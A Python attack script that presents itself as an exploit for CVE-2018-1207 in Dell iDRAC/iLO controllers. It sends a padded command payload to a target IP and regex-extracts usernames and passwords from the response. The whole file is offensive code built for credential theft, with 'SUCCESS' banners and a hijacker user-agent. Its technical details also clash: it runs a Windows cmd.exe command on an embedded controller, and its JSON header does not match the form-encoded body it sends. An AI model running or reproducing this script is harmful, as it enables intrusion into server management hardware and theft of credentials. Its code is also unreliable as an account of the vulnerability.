import requests
import sys
import re
import time

# --- Configuration ---
# The length of the buffer filler (usually 1500 is safe for CVE-2018-1207)
BUFFER_SIZE = 1500 
# The command to execute (Read the settings file)
COMMAND_PAYLOAD = 'cmd.exe /c type C:\\iDRAC\\config\\settings.xml'
# --- End Configuration ---

def exploit_cve_2018_1207(target_ip):
    """
    Exploits CVE-2018-1207 in iDRAC/iLO and extracts credentials.
    """
    url = f"https://{target_ip}:443"
    
    print(f"[*] Starting iDRAC Exploit...")
    print(f"[*] Targeting: {url}")
    
    # 1. Construct the full malicious payload
    buffer_filler = "A" * BUFFER_SIZE
    exploit_string = f"{buffer_filler}{COMMAND_PAYLOAD}"
    
    # 2. Setup headers and data (standard JSON structure for iDRAC config upload)
    headers = {
        'User-Agent': 'CVE-2018-1207-Simple-Hijacker',
        'Content-Type': 'application/json'
    }
    data = {
        "config": exploit_string
    }
    
    start_time = time.time()

    try:
        # 3. Send the POST request (The exploit delivery)
        response = requests.post(url, data=data, headers=headers, timeout=15)
        
        elapsed_time = time.time() - start_time
        
        print("\n" + "="*60)
        
        if response.status_code == 200:
            print(f"✅ SUCCESS! Exploit successful in {elapsed_time:.2f} seconds.")
            print("="*60)
            
            credentials_xml = response.text
            
            # 4. Parse the XML response to extract credentials
            
            # Regex to find content between <tag> and </tag>
            username_match = re.search(r'<username>(.*?)</username>', credentials_xml, re.DOTALL)
            password_match = re.search(r'<password>(.*?)</password>', credentials_xml, re.DOTALL)
            
            username = username_match.group(1).strip() if username_match else "N/A"
            password = password_match.group(1).strip() if password_match else "N/A"
            
            # 5. Display the results
            print("\n--- 🔑 Extracted Credentials ---")
            print(f"  🔑 Username: {username}")
            print(f"  🔒 Password: {password}")
            print("----------------------------------")
            print("\n[Full settings.xml content (raw response) is also available above]")
            
        else:
            print(f"⚠️ ATTACK FAILED (HTTP Status Code: {response.status_code})")
            print("   The iDRAC may have rejected the payload or is on a different port/firmware.")
            print("\n--- Response Preview ---")
            print(response.text[:500] + ('...' if len(response.text) > 500 else ''))
        
        print("="*60)

    except requests.exceptions.ConnectionError:
        print(f"\n❌ ERROR: Connection Failed!")
        print(f"   Could not connect to {target_ip}:443. Check the IP and ensure the iDRAC is running.")
    except requests.exceptions.Timeout:
        print(f"\n❌ ERROR: Request Timed Out!")
        print(f"   The iDRAC is too slow or the payload is too large for its stack.")
    except Exception as e:
        print(f"\n❌ CRITICAL ERROR: An unexpected error occurred: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 script.py [TARGET_IP_ADDRESS]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    exploit_cve_2018_1207(target_ip)

